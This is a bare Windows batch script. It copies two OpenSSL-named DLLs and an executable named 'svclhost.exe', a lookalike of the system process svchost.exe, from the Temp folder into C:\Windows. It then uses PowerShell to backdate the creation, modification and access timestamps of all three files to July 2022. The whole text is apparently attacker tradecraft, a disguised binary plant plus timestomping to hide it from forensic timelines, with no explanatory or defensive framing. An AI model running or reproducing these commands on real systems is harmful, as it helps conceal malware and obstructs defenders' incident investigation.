copy /y "C:\Windows\Temp\libssl-3.dll" "C:\Windows\libssl-3.dll"
copy /y "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\libcrypto-3.dll"
copy /y "C:\Windows\Temp\svclhost.exe" "C:\Windows\svclhost.exe"

powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\libcrypto-3.dll").CreationTime=("13 July 2022 13:51:00")
powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\libcrypto-3.dll").LastWriteTime=("13 July 2022 13:51:00")
powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\libcrypto-3.dll").LastAccessTime=("13 July 2022 13:51:00")
powershell -inputformat none -outputformat none -NonInteractive -Command 
powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\libssl-3.dll").CreationTime=("13 July 2022 13:51:00")
powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\libssl-3.dll").LastWriteTime=("13 July 2022 13:51:00")
powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\libssl-3.dll").LastAccessTime=("13 July 2022 13:51:00")
powershell -inputformat none -outputformat none -NonInteractive -Command 
powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\svclhost.exe").CreationTime=("13 July 2022 13:51:00")
powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\svclhost.exe").LastWriteTime=("13 July 2022 13:51:00")
powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\svclhost.exe").LastAccessTime=("13 July 2022 13:51:00")